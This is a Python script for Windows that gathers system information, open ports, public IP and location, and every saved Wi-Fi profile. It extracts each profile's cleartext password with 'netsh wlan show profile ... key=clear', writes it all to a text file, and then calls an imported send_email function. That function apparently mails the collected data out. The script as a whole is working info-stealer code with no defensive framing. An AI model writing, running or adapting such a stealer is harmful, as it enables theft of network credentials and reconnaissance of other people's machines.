import subprocess
import requests
from bs4 import BeautifulSoup
from send_mail import send_email



def system_info() :
    system_data = subprocess.check_output('systeminfo').decode('CP866')
    ports_data = subprocess.check_output('netstat -a').decode('CP866')
    print(system_data)
    print(ports_data)
    with open(file = 'check_system.txt', mode = 'a', encoding = 'utf-8') as file :
        file.write(f'SYSTEM INFO \n {system_data}\n {"*" * 100}\n \nINFORMATION ABOUT PORTS \n {ports_data} \n {"*" * 100}\n')


def check_ip() :
    ip_data = subprocess.check_output('nslookup myip.opendns.com. resolver1.opendns.com').decode('CP866').split('\n')
    ip_dns = [i.split(' : ')[0].strip() for i in ip_data if 'Address' in i][1]
    url = 'https://2ip.ru/'
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    ip = soup.find('div', class_ = 'ip').text.strip()
    location = soup.find('div', class_ = 'value-country').text.strip()
    name_pc = soup.find('div', class_='ip-icon-label').text.strip()
    print(f'Information about IP  \n {ip_dns}\n Name of PC : {name_pc}\n Location : {location}\n IP address : {ip}\n {"*" * 100}\n')
    with open(file = 'check_system.txt', mode = 'a', encoding = 'utf-8') as file :
        file.write(f'Information about IP  \n {ip_dns}\n Name of PC : {name_pc}\n Location : {location}\n IP address : {ip}\n {"*" * 100}\n')


def check_wifi():
    wlan_data = subprocess.check_output('netsh wlan show network').decode('CP866')
    print(wlan_data)
    with open(file = 'check_system.txt', mode = 'a', encoding = 'utf-8') as file :
        file.write(f'WLAN INFO \n {wlan_data}\n ')
    profiles_data = subprocess.check_output('netsh wlan show profiles').decode('CP866').split("\n")
    profiles = [i.split(" : ")[1].strip() for i in profiles_data if 'All User Profile' in i or 'Все профили пользователей' in i]
    for profile in profiles :
        profile_info = subprocess.check_output(f'netsh wlan show profile {profile} key=clear').decode('CP866').split('\n')
        try :
            password = [i.split(' : ')[1].strip() for i in profile_info if 'Key Content' in i or 'Содержимое ключа' in i][0]
        except IndexError :
            password = None
        print(f'WIFI INFORMATION\n Profile: {profile}\nPassword: {password}\n{"#" * 20}')
        with open(file = 'check_system.txt', mode = 'a', encoding = 'utf-8') as file :
            file.write(f'\n Profile: {profile}\nPassword: {password}\n{"#" * 20}')


def main():
    check_ip()
    system_info()
    check_wifi()
    send_email()


if __name__ =="__main__" :
    main()
